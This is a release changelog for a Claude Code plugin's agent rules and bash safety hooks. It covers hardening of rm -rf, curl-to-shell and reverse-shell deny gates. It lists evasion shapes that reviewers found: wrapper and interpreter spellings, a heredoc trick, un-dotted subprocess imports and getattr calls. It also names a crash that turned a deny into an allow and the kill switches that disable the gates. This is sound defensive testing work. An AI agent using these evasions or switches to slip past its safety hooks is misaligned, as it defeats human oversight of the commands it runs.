Two review rounds, each a fresh subagent told to falsify, moved the fix twice. The first (60 probes against this hook and 0.78.0's) found the draft anchor had turned 22 executable positions from deny into allow — `/usr/bin/python3`, `./venv/bin/python`, `PYTHONPATH=. python3`, `if python3 -c`, `! python3`, `find -execdir`, `>/dev/null python3`, `docker exec c python3`, `strace -f python3`, `su -c "…"`, `ssh h "…"` among them — that a two-line heredoc trick (`echo "<<EOF"`, the one-liner, a bare `EOF`) blanked the real command, and that the call-form `REVSH_EXEC` had lost the un-dotted family (`from subprocess import call`, `import subprocess as sp; sp.call(`, `os.system ('…')` with a space). The second (118 probes across three hook versions) found that repair covered the filed shapes rather than their classes: `su <user> -c` and `su -s /bin/sh -c` still went unwrapped while the CHANGELOG claimed otherwise, the heredoc view's quote state restarted on every line so a quote spanning two lines still blanked the command below, a `<<<` here-string was read as a heredoc opener, and a bare `fork(` token added for the node download-execute case denied an ordinary forking socket server and a `cluster.fork()` one-liner.

What ships: the anchor is "command position, then any chain of quote-free or simply-quoted tokens, then an optional path prefix" — a bare token before the interpreter is a wrapper, keyword, assignment or redirect and is not modelled further, a quoted token is consumed whole and never reaches the interpreter, which is what keeps the five data shapes allowed. This arm reads heredocs through its own awk with quote state that carries across lines and that refuses `<<<`; `su [-flag arg | -] [user] -c` and `ssh [opts] host '…'` payloads are unwrapped the way `sh -c` already was; `REVSH_EXEC` accepts whitespace before the paren, takes the un-dotted forms when the same one-liner imports the module (with an `import subprocess as X` alias read out of the text and tested as a dotted call), and spells the node case as `child_process…​.fork(` rather than a bare `fork(`. A third pass, scoped to verifying the second repair rather than extending it, found one more: the `su` rule spelled a flag as `-[a-zA-Z-]+`, so the login shorthand `su - <user> -c` matched neither the flag nor the username and went unwrapped, while every other `su` spelling closed. Its flag body is now `*` rather than `+`, which makes the bare dash a flag and leaves the capture-group numbering the replacement depends on untouched. Corpus: 15 R5 rows (5 red before the first draft, 727/732), 21 R6 rows (19 red against that draft, 734/753), 6 R7 rows (6 red against the second, 753/759), 4 R8 rows (2 red against the third, 761/763); 763/763 after, three consecutive runs.

Residual, stated in the hook and unchanged by this release: a quoted string that itself contains a separator before the one-liner (`git commit -m "x; python3 -c '…'"`) still anchors on the `;`; attribute-name evasion (`getattr(subprocess,'call')(…)`) is the price of call forms over the bare module token; and heredoc-fed interpreters (`python3 - <<EOF`), `$'…'` payloads, version-suffixed interpreter names (`python3.12 -c`) and a real newline inside the payload were never covered and still are not. Latency: two ten-run measurements of the same hook on this host disagree by more than the change (63 ms versus 146–162 ms for one ordinary command), so no latency figure is claimed beyond one added awk pass; the reviewer measured a 2000-line heredoc body at 186 ms on 0.78.0 and 195 ms here.

**Tests.** The three verbatim spec pins in `tests/scripts/spec-structure.test.js` are re-pinned to the shortened §11 / §11-O / §12 lines in the same commit as the rule text, which is the only way a whole-line pin is allowed to move. The independent mutation battery in `tests/tools/spec-pin-mutations.py` still targets the v6.26.0 wording and is not run in CI; it is left as the record of that review rather than rewritten against lines it never reviewed. Suite: node 1074/1074, bash hook suites all passed (`pre-bash-safety` 763/763), `shellcheck --severity=warning` clean, bash-3.2 constructs clean. Two transient full-run failures are not this release's: one `memory-tags-parity` case failed once and passed on three isolated re-runs and every later full run (the Round-14 audit filed it as REL-M2), and one run of the corpus suite reported 54 spurious `expected deny, got: (empty)` cases while the 12 GB `/tmp` tmpfs was full, then passed three times in a row once space was free. One macOS job in the release CI failed on a SQLite `disk I/O error` in `memory-maintenance.test.js`, a file this release does not touch; the re-run passed and the matrix is 7/7.
...
A minor bump rather than a patch. Spec rules steer agent routing, so changing one is a user-visible default-behaviour change in a released artifact and owes a non-patch version, a migration note and a stated way back — all three are below.

**What changes for you.** Claude will now end a turn while it waits for a subagent it spawned, naming who it is waiting for, where it previously held the turn open. Nothing is required of you when it does: the subagent's completion re-invokes Claude on its own, with no input from you. The visible difference is that a long orchestrated task shows a short "waiting on `<name>`" turn where it used to show a long silence. **Migration**: run `/claudemd-update`. It shows the diff, waits for your choice, and moves the previous `~/.claude/CLAUDE*.md` trio into `~/.claude/spec-backup-<stamp>/` before writing. `/claudemd-install` is a different path and not the one to use here: where `~/.claude/CLAUDE.md` is already a claudemd spec it takes no backup at all, by the design that fixed the v0.23.11 data-loss bug. **Way back**: pin the marketplace entry to `v0.77.0` **and then run `/claudemd-update`**. The pin on its own leaves `~/.claude/` at v6.26.0 — `install.js` refuses a downgrade unless `CLAUDEMD_ALLOW_DOWNGRADE=1`, and the SessionStart bootstrap logs `auto-sync skipped (would downgrade)` rather than reversing it, so `update.js` is the only spec writer that moves you backwards. A `~/.claude/spec-backup-<stamp>/` directory is a second route **only if you have one**: `/claudemd-update` writes it when it has something to write, but the usual upgrade path is the SessionStart bootstrap, which runs `install.js`, and that takes no backup at all when the home spec is already a claudemd spec. If such a directory does exist it may predate this release, so read the header line of `spec-backup-<stamp>/CLAUDE.md` before copying it back — nothing on that path checks the version. The npm package is not a route: `claudemd-cli` ships the standalone linter only and does not contain `spec/` — a test fails the build if it ever does. Either route then leaves a session banner asking you to undo it; both are advisory in the sense that matters — neither writes to `~/.claude/CLAUDE*.md`, so neither undoes your revert — though each does append a telemetry row and a bootstrap log line. After pin-plus-update the manifest still records 0.78.0, so the bootstrap prints `stale plugin registration … Fix: run /claudemd-refresh`, which would reinstall the version you just pinned away; after a backup restore the spec-drift banner prints `Fix: /claudemd-update`, which would write v6.26.0 back. The change is a permission — one more legal reason to yield — so reverting removes that permission and leaves no state to unwind.

**The measurement.** Taken from the v0.77.0 ship's own session transcript rather than from recollection. That ship ran as **one turn of 3h02m across 126 tool calls with no yield**, because §11 permitted no stop before VALIDATE. Two review subagents finished inside it and **zero** completion notifications reached context across the turn's 751 records; the queue flushed **230 ms** after the closing text block. `ListAgents` reported `reviewer-rotation · idle` at 16:57:45 and its report was written to a file at 17:09:40 — 12 minutes later, through a side-channel improvised mid-turn, and read a poll-interval after that. Sixteen `sleep` calls totalling 6870 s, **63%** of the 10 949 s window, each returned nothing: sleeping does not hasten a turn-end delivery, it postpones the turn end that IS the delivery. Six messages sent to teammates that had already gone idle produced six further completions — four of them carrying nothing but `DONE` — and those six are six of the eight `finished` events that arrived at once when the turn finally closed.

**No new HARD rule.** §13.2's ratchet sends a new incident to `tasks/rule-candidates-<YYYY-MM>.md`, not into the spec, and its evidence-rebuttal shortcut says an existing HARD shown in session evidence to produce wrong behaviour is fixed rather than wrapped. So §11 Mid-SPINE turn-yield takes a fourth yield trigger — awaiting a spawned subagent — alongside `[AUTH REQUIRED]`, genuine ambiguity and context pressure; the yield must name what is awaited, which leaves untouched the anti-silence clause the rule exists for, and a yield still unresumed when the user next types owes `tasks/<slug>-paused.md` exactly as a context-pressure yield does. Sleeping and messaging an idle teammate are described as the two substitutes that do not reach the report — as rationale, not as new prohibitions: §13.2's shortcut licenses fixing a rule, and adding bans is neither a downgrade nor a removal, so the sentence states why they fail instead of forbidding them. §EXT §12's manual-ship atomicity takes a second exception covering the pre-tag review wait, and that half is what breaks the deadlock: author ≠ reviewer is HARD, and §12 has no numbered steps of its own, but a project whose runbook orders that review between the push and the tag puts it inside the window that forbade turn-ending. §EXT §11-O records the delivery fact plus the fallback for a cycle that genuinely cannot yield — name an absolute output path in the spawn prompt and poll that file, since `TaskOutput` is deprecated for local agents and warns that a local agent's output file is a symlink to the full JSONL transcript, and the notification channel is not pollable.

Enforcement partition unchanged at 6 hook / 16 self / 2 both / 1 external: `§11-mid-spine-yield` keeps its `section_anchor` and `enforcement: self`, and no rule was added or removed. Three `spec-structure` tests pin the rule text **verbatim** rather than asserting what it means. Two drafts tried to assert meaning and the pre-tag review broke both — five mutations against the first, seven more against the second, every one of them green. `**Second exception**: none — … the wait is held open, never yielded.` satisfied a heading check and a `suspend` blacklist; `do NOT name an absolute output path` satisfied a positive-phrase check and a `never name` blacklist; the trigger list was reverted to the v6.25.4 enumeration verbatim with the bold phrase parked in a sentence that withdrew it, which a delimiter-terminated slice silently swallowed because the delimiter occurs twice on that line. Each repair added tokens to a blacklist and the next reader wrote around it, because a regex cannot decide what English prose means. So these do not try: each test asserts that exactly one line carries the rule's bold heading and that the line **equals** its pinned text. That claims nothing about meaning, and its scope is the line: **the pinned line** cannot change silently, because the pin and the rule move in the same diff, in front of a human. It says nothing about the line's neighbours — a bullet placed beside the rule can revoke it, and a preamble above it can weaken it, with every gate green; the round-3 review demonstrated both against a full clone at exit 0, and the test file states it where a maintainer will read it. Closing that would need a mechanism asserting the semantics of surrounding prose, which is the approach two rounds already falsified. Legitimate rewording fails it by design. Whole-line equality rather than a pinned clause, because a clause pin leaves the rule's own words intact while a sentence appended after them takes the rule back, and the gate stays green; that hole is mutation Z1 and it was found here rather than by a reviewer. The harness is tracked at `tests/tools/spec-pin-mutations.py` and carries all 21 mutations from both review rounds plus that one, each applied alone to a fresh tree and each checked to have actually changed the file before the result counts: **18/18** unmutated, 20 of the 21 red (18 inverting or removing, plus 2 meaning-preserving rewordings that a verbatim pin catches by construction), and the one control that relocates a rule without editing it green. Suite: node 1069 → **1074/0**, bash hook suites **1302/1302**, `version-cascade-check` ok at v6.26 across 3 files with Sizing drift inside ±20B. Core spec 23445 → 23944 bytes (1056 under the 25000 cap); extended 43819 → 45899 (4101 under 50000 — the Sizing line's own claim of 45889 sits 10 bytes inside its declared ±20B self-rewrite envelope). The bash 3.2 **runtime** leg is SKIP here (`BASH32_BIN` unset); the constructs leg passes and the CI matrix carries the macOS legs.

## [0.77.0] - 2026-09-06

The round-13 audit's next-batch list, executed end to end: two false-deny/data-path defects, the rotation redesign the last release deferred, one item that turned out to have been closed for three rounds, and the first slice of the `doctor()` split. Spec unchanged at **v6.25.4**.

A minor bump rather than a patch. One of the four changes what the `/claudemd` gates deny, and a user-visible default-behaviour change in a released artifact owes a non-patch version, a migration note and a stated way back — all three are below.

**A dangling `~/.claude/CLAUDE.md` symlink put the spec inside the user's dotfiles repo.** `existsSync` FOLLOWS a link, so a stow/chezmoi user whose dotfiles checkout has moved has an entry that reports as absent — and three separate gates filtered the file list with it: `install.js`, `update.js`, and `createBackup`'s own loop. The entry was dropped before any backup was taken, survived in `~/.claude`, and `copySpecFiles`' `copyFileSync` then resolved it: `open(O_CREAT)` walks the link, so install CREATED a 25 KB spec file inside the user's repository, where they may commit it. Reproduced end to end through `install()` in a redirected-HOME sandbox. `entryPresent()` in `backup.js` is now the single source for "there is a directory entry here, dangling link included", and a dangling link is moved aside AS a link — the bytes were never claudemd's. That covers every path that takes a backup, which is not every path: when `~/.claude/CLAUDE.md` is already a claudemd spec, install takes no backup at all by design (the v0.23.11 spec-on-spec data-loss fix), so a dangling `CLAUDE-extended.md` beside it never reaches `createBackup` — and that is the upgrade population. `copySpecFiles` therefore refuses to write through a dead destination link: it removes the entry, writes a real file, and prints the target the link named so it can be rebuilt. A LIVE link is deliberately untouched on that branch — a user who symlinks the spec into a dotfiles repo that is actually there wants the new bytes to land in it. On install's backup branch and on every update, `createBackup` moves a live link aside first and the bytes land in a fresh regular file; that is pre-existing behaviour and unchanged here, but it means the pass-through holds for one of the three paths rather than all of them. An UNREADABLE target — an unmounted network directory, a mode-0700 parent — is not a dead link and is left alone: only an errno that states no entry can exist there — ENOENT, or ENOTDIR through a file-shaped path component — licenses removing it.

**The trigger view read a backslash-escaped quote as a real one, and denied on prose.** `HOOK_TRIGGER_QUOTE_AWK` had no escape handling, so `echo won\'t break && gh release create v1 --notes "runbook"` opened a single-quote region at the apostrophe that never closed; the whole tail was re-emitted verbatim, `runbook` reached the §11 tag matcher, and the gate denied an ordinary release command. The same class inside double quotes — `echo "a \" ; git push origin main"`, which bash reads as ONE argument to `echo` — put `git push` at what looked like command position and reached the §7 gate the same way. v0.76.2 named this as the unintended half of its own consistency fix and deferred it here. The machine now models bash's rules, which differ per state: unquoted, `\X` makes X literal and both characters are re-emitted verbatim; inside `'...'` there is no escape processing at all; inside `"..."` a backslash consumes the next character, so `\"` does not close the string. The false-negative direction lives on `\\`, which is consumed AS A UNIT so the `"` after it really does close and the command following it stays visible — four guards assert exactly that. `$'...'` is deliberately not modelled: ANSI-C quoting has its own rules and adding a state moves in the FN direction on a gate that denies, while today's mismatch fails VISIBLE, which is the safe direction. The §8 gate's rm / npx / curl-sh arms read a separate machine (`sanitize_cmd`) and are unmoved — ten escape-bearing shapes across those three families give identical verdicts before and after. Its reverse-shell arm is not separate: it builds its view from this function, and two of its verdicts moved, both toward bash. A transport inside an escaped-quote body is one argument to `echo` and never runs, so the gate now agrees with the shell; after `\\` the quote really closes and a transport following it still denies. Four corpus rows cover that arm, and the two that assert the new answer fail against the pre-change machine.

**The rotation redesign was pulled from this release.** `rule_hits_append` rotates its log under a `mkdir` mutex, and it still does. A rename-claim replacement was written, measured and reviewed here, and it is not shipping: three review rounds each found one High in it, and the last of them priced the state it leaves better than any argument could. With a stale orphan on disk and four concurrent appends, over 120 trials, the mutex retains two generations 120 times out of 120 (the wrong two — that was the round-2 finding), the first claim version 75, and the second 30. The selection had become right and the retention worse than either predecessor, because the claim gives one process ownership of the LIVE log while both the reaper and the rotator still mutate the two archive slots with nothing serialising them. `hooks/lib/rule-hits.sh` and its suite are back at their v0.76.2 state, unchanged by this release.

What that leaves standing is a known, measured condition users are already running: on a host whose `/usr/bin/mkdir` is uutils coreutils 0.8.0 — the Ubuntu 25.10 default — 200 trials of four processes racing one path produce 206 wins where 200 are expected, so the mutex admits two holders often enough to lose an archive 8 times in 200 with a stale lock present. That is unchanged from v0.76.2 and is the reason the redesign exists; it will ship when the exclusion covers the archive slots as well as the live log, with its own release and its own review. The work, the measurements and the four findings are recorded in the audit report rather than discarded.

**A gate item that had been closed for three rounds.** The 0.71.1 entry's "left open, recorded, not fixed" pair — an artifact match that was all-or-nothing over an unanchored name, and a narrowing inside `shell-files.sh` that only a floor of 40 guarded — was still being carried as unreviewed. Both halves shipped in 0.71.2 and 0.71.3 with their own assertions: presence judged on a definition site rather than on a name appearing anywhere, and the shared shellcheck scope compared as a SET against `git ls-files` rather than by count. Verified by running those assertions rather than by reading the comments that claim them. No code in this release.

**`doctor()`'s two hook self-test tables move to their own module.** It was 1,282 lines while the audit was still quoting 1,069. The deny self-tests and the liveness probes for the eleven hooks that never emit one are the largest block with a clean boundary — they take `push`, `which` and the plugin root and read none of doctor's other locals: `scripts/doctor.js` 1,282 to 955, `scripts/lib/doctor-hook-tests.js` 364. Behaviour identity was the gate, not the suite alone: five sandbox HOMEs, `doctor()` over each, paths and timestamps normalised out, 197 check rows byte-identical before and after. The rest of the split is deliberately not done — `doctor.js` is a source-text subject of two gates that read it rather than import it, and every further extraction has to be re-enrolled in both or the moved code leaves their scope.

**Going back.** The gate behaviour is the only user-visible change, and it removes denials rather than adding them. Reverting to v0.76.2 restores the prior parse; per-invocation, `[skip-memory-check]` remains the §11 escape hatch, and `DISABLE_MEMORY_READ_HOOK=1` / `DISABLE_SHIP_BASELINE_HOOK=1` / `DISABLE_BANNED_VOCAB_HOOK=1` remain the kill switches for the three consumers.

**Two reviewers were given the range with empty context and told to falsify it, and they blocked the tag three times.** Everything they found in the rotation redesign is moot here — that change is not in this release, for the reason above. What they found in the code that IS shipping is fixed, each with a test that fails against the code before it.

A live symlink whose target is UNREADABLE rather than absent was being deleted without a backup, and the warning printed for it said the target does not exist while it did and still held the user's bytes. `existsSync` is false for any stat failure; the check is now an errno class, and only one that states no entry can exist at that path licenses removing the entry.

Three comments and a paragraph of these notes claimed the §8 gate was untouched by the quote-machine change. Its rm / npx / curl-sh arms read `sanitize_cmd` and are unmoved, but `pre-bash-safety-check.sh:552` builds its reverse-shell view from `hook_trigger_view`, so that arm consumed the changed machine and two of its verdicts moved. The ten shapes originally measured were the three families that could not move, and the six corpus rows added with them pass against the pre-change gate too — they measured nothing. Four reverse-shell rows now cover the arm that did move, and the two asserting the new answer fail against the pre-change machine.

Verified: `npm run check` exit 0, node 1061 to 1069 pass / 0 fail, bash hook suites 1283 to 1302 pass / 0 fail, the §8 corpus 707 to 717, shellcheck clean at warning+, and the version cascade reporting 0.77.0 across 6 sites. Every defect in this release carries a test confirmed to fail against the code before it.

## [0.76.2] - 2026-09-06

The round-13 audit's three findings, plus a P1 that turned up while qualifying the round's one open suspicion. Every item was reproduced in a sandbox before anything was changed, and each carries a test that fails against the prior code. Spec unchanged at **v6.25.4**.

Every one of the four is the same shape: a path that reports success having done nothing.

**A personal `CLAUDE.md` that was a symlink was backed up into a dangling entry.** `rename(2)` moves the LINK, and a relative target re-resolves against its new parent — so `~/.claude/CLAUDE.md -> ../dotfiles/CLAUDE.md`, the GNU stow default and chezmoi's usual shape, landed in `backup-<stamp>/` resolving one directory deeper and could not be opened before install had finished. Everything downstream then read as success on it: install's WARN named that path as where the user's instructions went, `restoreBackup` skipped the unstattable entry by the guard added for dangling entries, and `CLAUDEMD_SPEC_ACTION=restore` printed `specAction: "restore"` having copied nothing back. The dotfiles source was never touched, so this cost a restore, not data. `createBackup` now re-points a symlinked source at its absolute target and moves the link rather than renaming it; `uninstall.js` returns the `restored` list it had always been discarding and sets `warning: "restore-empty"` when that list comes back empty. `specAction` keeps its existing value set — the enumeration is an output contract that `commands/claudemd-uninstall.md` and the user-journey suite both assert on, so the new distinction is carried by new fields rather than a renamed value.

**The §11 memory gate matched tags against text its own sanitizer had eaten — expect it to deny more.** The tag-match stage still used the two independent line-based seds that R11-05 replaced in `hook_trigger_view`: single- and double-quote context are mutually exclusive in the shell, so two passes pair the closing quote of one region with the opening quote of the next and delete the command between them. `grep 'a"b' f && ship runbook && grep 'c"d' g` reached `memtags_match` as `grep '' g`, so a HARD gate exited 0 on a command its own trigger had just decided to hold, and emitted no fail-open row on the way out. It now calls the shared `HOOK_TRIGGER_QUOTE_AWK`, asserted non-empty alongside its sibling constant. **This is the one user-facing behavior change in the release**, and it has two classes, the second found by the pre-tag review rather than by the change's author. The intended one: commands mixing both quote styles, each containing the other's quote character, now reach the tag matcher intact and can be denied where they previously passed — the gate doing what it documents. The unintended one: the shared state machine has no backslash handling, so a **backslash-escaped quote** (`echo won\'t break && gh release create v1 --notes "runbook"`) opens a region that never closes, and the unterminated body is re-emitted verbatim into tag matching. Commands of that shape can now be denied although they are ordinary valid bash. The trigger stage has always behaved this way, so the two stages are now consistent rather than newly wrong, but the limitation has moved into the stage that denies. Teaching the state machine about `\` touches all three of its consumers including the §8 gate, so it is deliberately not being done in the same release; it is the top item in the next round. `[skip-memory-check]` remains the per-invocation escape hatch, `DISABLE_MEMORY_READ_HOOK=1` the kill switch, and reverting to v0.76.1 restores the prior behavior.

**`/claudemd-doctor` read "this project has no MEMORY.md" as a disabled hook.** `mem-index-missing`, `transcript-missing` and `event-fields-missing` mean the gate ran and had nothing to evaluate. Classed with the jq/patterns prerequisites they printed `enforcement silently bypassed (jq / patterns-file prerequisite missing). Investigate and restore.` — a repair instruction that repairs nothing — and held `doctor` at exit 3 for the full 30-day window after a single ship command in a single index-less project. They are now an advisory bucket that still prints its count, and a red row names the advisory count alongside its own. The unevaluable set is the closed one, so a reason no one has classified stays red.

**The rotation mutex guarded the two moves, not the decision to move.** v0.76.0's `mkdir` mutex was adjudicated closed on a test that holds the lock across the second append — which can only ever reach the arm where `mkdir` fails. The arm that loses data is the one where it succeeds a moment too late: P2 reads the size while the log is still over the cap, P1 rotates and releases, and P2's `mkdir` then wins an uncontested lock and re-runs the two-step move on a log that is already rotated. `mv .1 .2` carries P1's fresh archive onto `.2` and `mv log .1` fails silently, leaving `{gone, gone, live-as-.2}` — the signature the mutex was added to prevent, under the mutex. Measured with four concurrent appends over an over-cap log: both archives were lost in a few percent of trials with no lock involved at all, and several times more often with a stale lock also present; an independent reviewer's own harness reproduced the same direction at 5/150 and 24/150. The size that authorizes a rotation is now re-read inside the mutex, so a second holder finds a log that is gone or under the cap and does nothing — zero in the no-lock arm on both harnesses. `ROT-6` pins it with a counting `stat` shim that answers the first size query over-cap and later ones truthfully, which is precisely the state the losing process is in.

Absolute rates are deliberately not quoted here. The pre-tag review established that the development host's `mkdir` is uutils coreutils 0.8.0 and **not reliably atomic** — 200 trials of four processes racing one path gave 206 wins where 200 were expected — so every end-to-end run on it was measuring the rotation race and an unreliable mutex at the same time. Re-run with an atomic `mkdir`, the fix takes both arms to zero. Two consequences worth stating plainly: the bug this closes was worse than the first measurement suggested, and on a uutils-coreutils host (the Ubuntu 25.10 default) the `mkdir` mutex does not by itself guarantee mutual exclusion at all. That last point is a finding about the platform, not about this release, and it is now the reason the generation-claim design below is the preferred next step rather than one option among several.

**Left in place, on purpose**: the stale-lock reap is still check-then-`rmdir`, so a reaper that decided "stale" can remove a lock another process acquired in between. The `mv "$lock" "$lock.reap.$$"` recipe proposed for it is still rejected, but on structure rather than on measurement — `rename(2)` is atomic about the move, not about the identity of what it moved, so a late reaper carries off a fresh lock exactly as `rmdir` deletes one. Claiming the live generation by rename would close it, does not depend on `mkdir` being atomic, and introduces an orphan class needing its own reaper; the residual costs archived telemetry, never a gate decision or user data. The reasoning and the design sketch are recorded at the reap branch.

**Found by the pre-tag review and fixed before the tag.** Two independent reviewers were given the commit range and told to falsify it; between them they blocked the tag twice, and the repairs are in this release. The in-mutex size re-read above was written as `stat -c %s F || stat -f %z F || echo 0`, which reads as a GNU/BSD dual and is not one: on GNU coreutils `-f` is `--file-system` and `%z` parses as an operand, so against an existing file the fallback prints the filesystem block to stdout and exits 1, the `||` chain appends `0` to that blob, and `(( size > max_bytes ))` under the `set -u` every hook sets then dereferences the word `File` and **exits the shell**. Because `hook_record` calls `rule_hits_append` inline and every deny path records before it denies, that abort turned an immutable §8 `rm -rf` deny into an allow, with no telemetry row and no fail-open marker — reproduced end to end. Both size reads now carry the numeric guard the `max_mb` env read already used, and `ROT-7` pins it. Separately, `createBackup` resolved a symlink's target with `path.resolve`, which collapses `..` lexically while the kernel resolves it against the real parent: when `~/.claude` is itself a symlink — the same synced-dotfiles population this release is for — the backup entry pointed at whatever sat at the lexical path, and restore wrote that file, or nothing at all, which is the exact symptom being fixed. It now resolves against `fs.realpathSync` of the parent. Finally, `transcript-missing` and `event-fields-missing` were pulled back out of the advisory bucket: both reviewers pointed out that they are the cwd-encoding drift alarm audit R10-06b added, not "this project has no memory" — `memory-read-check.sh` says so beside its own emitters — so only `mem-index-missing` is advisory now, and 200 rows of the drift signature stay red.

**Known and not fixed here**, both pre-existing and both recorded in the audit report: a *dangling* `~/.claude/CLAUDE.md` symlink is skipped by `createBackup`'s existence check, so no backup is taken and `copySpecFiles` then writes the spec through the link into the user's dotfiles repo; and the shared quote state machine is quadratic, now run twice per command, which costs ~350 ms on a 100 KB command against a 3 s hook budget.

`restore` also gained a documentation answer rather than a behavior change: it restores and does not remove, so `CLAUDE-extended.md`, `CLAUDE-changelog.md` and `OPERATOR.md` stay behind. Removing spec files is `CLAUDEMD_SPEC_ACTION=delete`, and that path is gated behind `CLAUDEMD_CONFIRM=1`; widening `restore` would route the same deletion around that confirmation.

node 1050 → 1059 pass / 0 fail, bash hooks 730 → 733 PASS / 0 FAIL, `npm run check` exit 0.
...
The install path a user actually walks is two commands — `/plugin marketplace add`, `/plugin install` — and nothing else. `/claudemd-install` exists for the rest, and the reason it exists is that Claude Code does not fire `postInstall`, so `install.js` first runs from the next session's `SessionStart` hook. That much was known and documented. What was not: the bootstrap it runs is **detached**, and the file it writes — `~/.claude/CLAUDE.md` — is user-global context Claude Code assembles at session start. A background job racing that assembly does not lose sometimes; it loses by construction. So the spec's first appearance in context was the session *after* the bootstrap, i.e. the **third** counting from `/plugin install` (session 1 has no `SessionStart` for a plugin that was not loaded when it began). Nobody who skipped the optional command was told any of this, and `/claudemd-status` reporting `cache-present-bootstrap-pending` reads like a transient state rather than a two-session lag.

Worth separating from the alarm it sounds like: **hook enforcement was never affected.** Hooks are registered by the plugin's own `hooks/hooks.json`, which Claude Code loads directly, and every pattern file they match against ships in the plugin root — `settings.json` carries no claudemd hook entries at all. All fifteen are live the moment the plugin activates. What was late is the half of claudemd that works by being read: the §5.1/§10/§11 rules no hook can enforce.

**The fresh-install bootstrap now runs inline**, bounded at 4 s against the 5 s `SessionStart` budget in `hooks.json`. Blocking session start is exactly what the detached spawn was built to avoid, so the branch is narrow on purpose: only when *neither* manifest shape exists — once per machine — and never on the upgrade path, where a spec is already on disk and lateness costs staleness rather than absence. Measured cost is ~65 ms (four spec copies plus one atomic manifest write), so the ceiling is ~60× the work.

Three properties keep the block from being a new way to hang: `install.js` writes its manifest last and atomically, so a run killed at the ceiling leaves no manifest and the next `SessionStart` re-enters the same path; a failed inline run falls through to the detached spawn *in the same session*, making the branch never worse than what it replaces; and `CLAUDEMD_FORCE_ASYNC_BOOTSTRAP=1` opts out entirely for a slow or networked `$HOME`. The 4 s literal sits at the call site rather than in a variable because `tests/hooks/hook-budget.test.sh` greps `platform_timeout [0-9]+` out of registered hook files — a named constant would have passed the gate while being invisible to it, which is the failure this release is about in miniature.

Telemetry distinguishes the paths: a `bootstrap-sync` row means the spec was on disk before the hook returned, `bootstrap` means detached. `hook_spawn_install`'s sentinel bookkeeping is now shared (`hook_install_sentinel_clear` / `_write`) rather than hand-copied into the second call site — the 2026-07-15 seam audit caught that exact drift the first time there were two of them.

**The same redirect hid the one thing install does to a file it does not own.** `install.js` has printed a `[claudemd] WARN:` line since v0.5.3 when the `~/.claude/CLAUDE.md` it is about to replace carries no `# AI-CODING-SPEC` H1 — i.e. when it is the user's own hand-written user-global instructions, read by Claude Code in every project on the machine. That warning names the `backup-<stamp>/` dir the file was moved to and the `CLAUDEMD_SPEC_ACTION=restore` command that brings it back. It reaches a human only when `install.js` runs in the FOREGROUND: `/claudemd-install`, or the manual `node scripts/install.js` fallback. On the bootstrap path — the one this release is about, the one taken by anyone who ran the two documented `/plugin` commands and nothing else — both streams go to `claudemd-bootstrap.log`. So the notice was written every time and read never: personal instructions stopped applying, in every project, with no in-session signal and no pointer to the backup holding them. Reproduced end-to-end 2026-09-05 (hand-written `CLAUDE.md` → `SessionStart` → hook stdout empty, stderr empty, WARN in the log only).

`install.js` now leaves a `user-content-backup.json` sentinel carrying the backup path, and `session-start-check.sh` turns it into a `SessionStart` banner and consumes it (`rm`, not the `.last-shown` rename — the backup dir named in the message is the durable artifact, and the rename idiom is already the source of a state file nothing reaps, R10-21e). On the inline path the banner lands in the session that did the overwrite, which is the second thing the sync branch buys: the result is knowable before the hook returns. Under `CLAUDEMD_FORCE_ASYNC_BOOTSTRAP=1` the sentinel outlives the detached run and the version-match branch surfaces it next session. Both banner emits fold into the existing `jq -s` merge — the tail's emit moved BELOW the bootstrap so one object still reaches stdout, since CC's strict single-value `JSON.parse` drops every banner when a second object appears, not just the new one. Opt out with `DISABLE_USER_CONTENT_BANNER=1`; the backup, the stderr WARN and the sentinel are unaffected.

**`design-detect --cwd` reported a missing directory as a finding about the project.** `detect()` is fail-open by design, so a path that is not there walked an empty tree and returned `no-ui` — and `commands/claudemd-design-adopt.md` instructs the caller to report the verdict, so a typo'd or since-moved `--cwd` came back to the user as "this project is not a UI project". The flag now exits 2 naming the path, for a missing directory and for a file alike; the bare no-flag `process.cwd()` path is untouched, and `detect()` itself stays fail-open for its library callers. The test that covered this asserted `no-ui` — it pinned the behavior rather than the requirement.

`commands/claudemd-install.md` claimed the command makes "hooks fire in THIS session." It never did that; the hooks were already firing. The doc now says what the command actually delivers.

**Pre-tag review, folded — 2 SHOULD-FIX, 5 NOTE** (two independent reviewers, both returning "nothing blocking"; the overlap between them is where the findings below come from). One was a defect in this release's own new code: `design-detect --cwd=` with an EMPTY value walked past the guard added above, because the guard tested truthiness and `parseStrict` stores `''` — so it fell through `|| process.cwd()` and answered confidently about the current directory, which is the exact failure the guard exists to close, reachable the likeliest way anyone hits it (a caller interpolating `--cwd=$VAR` from an unset variable). It now tests presence and rejects the empty value on its own.

The `DISABLE_USER_CONTENT_BANNER=1` path returned before consuming its sentinel, so opting out left a fixed-name singleton that nothing reaps — `clean-residue`'s `STATE_EPHEMERAL` is a per-session allowlist and does not name it — and unsetting the knob later would have fired a banner naming a `backup-<stamp>/` dir `pruneBackups` may since have evicted. That is the R10-21e residue class the `rm`-over-rename choice cites as its own reason for existing, reintroduced through the opt-out. The opt-out now consumes the sentinel silently; both reviewers caught this independently, from opposite directions (one from the leak, one from a test comment that asserted the opposite of its own assertion).

Also: `docs/HOOK-PROTOCOL.md`'s worked example for the one-object rule still said the merge holds "four banners" and cited line numbers that were already stale pre-diff — it is the reference a contributor reads before adding the next banner, so it now names both merge sites and their real counts. The `>> "$LOG" 2>/dev/null` redirections on the new foreground branch are reordered to `2>/dev/null >> "$LOG"`: redirections apply left to right, so an unwritable log file leaked "Permission denied" to the hook's real stderr — invisible pre-0.75.0 only because every write on that path used to live inside the detached spawn's `>/dev/null 2>&1`. Case 31's positive half polls for the detached header instead of racing it. `architecture-drift.test.js`'s R10-13 mutation control had gained a second hole (`user-content-backup` was missing from its hand-copied regex alongside the deliberate `statusline-prev`), which would have kept it green for the wrong reason; it is mirrored, and a new assertion pins that exactly one stem is unmatched. New Case 37 covers the `command -v node` bailout — one of the two guards this release added precisely to stop dropping a pending consume-once banner, and previously untested.
...
